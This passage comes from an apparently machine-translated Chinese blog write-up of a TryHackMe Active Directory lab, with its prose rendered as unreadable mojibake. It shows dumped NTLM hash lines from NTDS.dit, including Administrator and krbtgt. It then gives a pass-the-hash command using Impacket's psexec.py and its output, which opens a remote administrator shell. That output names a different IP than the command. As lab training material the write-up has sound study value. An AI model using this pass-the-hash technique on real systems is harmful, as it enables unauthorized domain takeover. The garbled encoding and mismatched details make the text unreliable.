jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">Ntdsã€‚ditæ–‡ä»¶æ˜¯å­˜å‚¨Active Directoryæ•°æ®çš„æ•°æ®åº“ï¼ŒåŒ…æ‹¬æœ‰å…³ç”¨æˆ·å¯¹è±¡ã€ç»„å’Œç»„æˆå‘˜çš„ä¿¡æ¯ã€‚é‡è¦çš„æ˜¯ï¼Œè¯¥æ–‡ä»¶è¿˜å­˜å‚¨äº†åŸŸä¸­æ‰€æœ‰ç”¨æˆ·çš„å¯†ç æ•£åˆ—ã€‚</p></blockquote><p id="1bd0" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">è¿™ä¸ªå·¥å…·ä¸ºDCæœºå™¨ä¸Šçš„æ‰€æœ‰ç”¨æˆ·è½¬å‚¨NTLMæ•£åˆ—ã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="17d3" class="mn lc iq mj b gy mo mp l mq mr">Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::<br/>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br/>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::</span><span id="e36b" class="mn lc iq mj b gy ms mp l mq mr">.....etc.....</span></pre></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="347f" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">ä¼ é€’å“ˆå¸Œ(PtH)æ”»å‡»</h1><p id="fad8" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">ä¸€ç§æ”»å‡»æ–¹æ³•æ˜¯<strong class="jw ir">Pass Hash</strong>æ”»å‡»ï¼Œå®ƒå¯ä»¥è®©æˆ‘ä»¬åœ¨æ²¡æœ‰å¯†ç çš„æƒ…å†µä¸‹éªŒè¯ç”¨æˆ·èº«ä»½ã€‚</p><blockquote class="mt mu mv"><p id="72a7" class="ju jv kt jw b jx jy jz ka kb kc kd ke mw kg kh ki mx kk kl km my ko kp kq kr ij bi translated">ä¼ é€’å“ˆå¸Œæ”»å‡»æ˜¯ä¸€ç§æŠ€æœ¯ï¼Œæ”»å‡»è€…é€šè¿‡è¿™ç§æŠ€æœ¯æ•è·å¯†ç å“ˆå¸Œ(ç›¸å¯¹äºå¯†ç å­—ç¬¦)ï¼Œç„¶åç®€å•åœ°ä¼ é€’å®ƒä»¥è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå¹¶å¯èƒ½æ¨ªå‘è®¿é—®å…¶ä»–ç½‘ç»œç³»ç»Ÿã€‚</p></blockquote><p id="73f1" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">æœ‰å¤šç§å·¥å…·å¯ä»¥ç”¨æ¥æ‰§è¡Œpass hashæ”»å‡»ï¼ŒåŒ…æ‹¬<strong class="jw ir"> Evil-WinRM </strong>ã€<strong class="jw ir"> crackmapexec </strong>å’Œ<strong class="jw ir"> psexec.py </strong>ã€‚æˆ‘å¾ˆéš¾è®©Evil-WinRMå·¥ä½œï¼Œä½†èƒ½å¤Ÿä½¿ç”¨psexec.pyè·å¾—ä¸€ä¸ªå¸¦æœ‰ç®¡ç†å‘˜NTLMå“ˆå¸Œçš„shellã€‚</p><pre class="me mf mg mh gt mi mj mk ml aw mm bi"><span id="cba3" class="mn lc iq mj b gy mo mp l mq mr">python3 psexec.py Administrator@10.10.25.158 -hashes aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc</span><span id="68ad" class="mn lc iq mj b gy ms mp l mq mr">Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation</span><span id="2f88" class="mn lc iq mj b gy ms mp l mq mr">[*] Requesting shares on 10.10.200.95.....<br/>[*] Found writable share ADMIN$<br/>[*] Uploading file eanlOsfQ.exe<br/>[*] Opening SVCManager on 10.10.200.95.....<br/>[*] Creating service GzYy on 10.10.200.95.....<br/>[*] Starting service GzYy.....<br/>[!] Press help for extra shell commands<br/>Microsoft Windows [Version 10.0.17763.1490]<br/>(c) 2018 Microsoft Corporation. All rights reserved.</span><span id="e1f3" class="mn lc iq mj b gy ms mp l mq mr">C:\Windows\system32&gt;</span></pre><p id="04ea" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">ä»è¿™é‡Œï¼Œæˆ‘å¯ä»¥æœ‰æ•ˆåœ°å®Œå…¨æ§åˆ¶ADåŸŸï¼Œå¹¶å¯ä»¥æ£€ç´¢æ‰€æœ‰ä¸‰ä¸ªæ ‡å¿—ã€‚</p><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/ec7a2bcaad80fba209b829c3244ea9db.png" data-original-src="https://miro.medium.com/v2/resize:fit:1010/format:webp/1*veVVE2SR00MYyeX2tJMz-Q.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">ç”¨æˆ·æ ‡å¿—ã€‚</figcaption></figure><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/122486f117a3389836c3528b43962eb8.png" data-original-src="https://miro.medium.com/v2/resize:fit:918/format:webp/1*toC_TGPHwtZb83FVJ16lUw.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">æƒé™æå‡æ ‡å¿—ã€‚</figcaption></figure><figure class="me mf mg mh gt jr gh gi paragraph-image"><div class="gh gi ng"><img src="../Images/58f42142a5879df319e1a81c8fb0e76c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1008/format:webp/1*q07yBp1u447POEJ-pyxShA.png"/></div><figcaption class="na nb gj gh gi nc nd bd b be z dk translated">æ ¹æ ‡å¿—ã€‚</figcaption></figure></div><div class="ab cl ku kv hu kw" role="separator"><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz la"/><span class="kx bw bk ky kz"/></div><div class="ij ik il im in"><h1 id="df60" class="lb lc iq bd ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly bi translated">æœ€åçš„æƒ³æ³•</h1><p id="f369" class="pw-post-body-paragraph ju jv iq jw b jx lz jz ka kb ma kd ke kf mb kh ki kj mc kl km kn md kp kq kr ij bi translated">æˆ‘çœŸçš„å¾ˆå–œæ¬¢åœ¨è¿™ä¸ªæˆ¿é—´é‡Œå·¥ä½œï¼Œå¹¶æœ‰æœºä¼šå­¦ä¹ æ›´å¤šå…³äºåˆ©ç”¨Active DirectoryåŸŸæ§åˆ¶å™¨çš„çŸ¥è¯†ã€‚è°¢è°¢ä½ ä¸€ç›´è¯»åˆ°æœ€åï¼Œç»§ç»­é»‘ä¸‹å»ğŸ˜„ï¼</p><div class="nh ni gp gr nj nk"><a href="https://tryhackme.com/" rel="noopener  ugc nofollow" target="_blank"><div class="nl ab fo"><div class="nm ab nn cl cj no"><h2 class="bd ir gy z fp np fr fs nq fu fw ip bi translated">ç½‘ç»œå®‰å…¨åŸ¹è®­</h2><div class="nr l"><h3 class="bd b gy z fp np fr fs nq fu fw dk translated">TryHackMeæ˜¯ä¸€ä¸ªå…è´¹çš„å­¦ä¹ ç½‘ç»œå®‰å…¨çš„åœ¨çº¿å¹³å°ï¼Œä½¿ç”¨åŠ¨æ‰‹ç»ƒä¹ å’Œå®éªŒå®¤ï¼Œé€šè¿‡æ‚¨çš„â€¦</h3></div><div class="ns l"><p class="bd b dl z fp np fr fs nq fu fw dk translated">tryhackme.com</p></div></div><div class="nt l"><div class="nu l nv nw nx nt ny js nk"/></div></div></a></div></div></div>    
</body>
</html>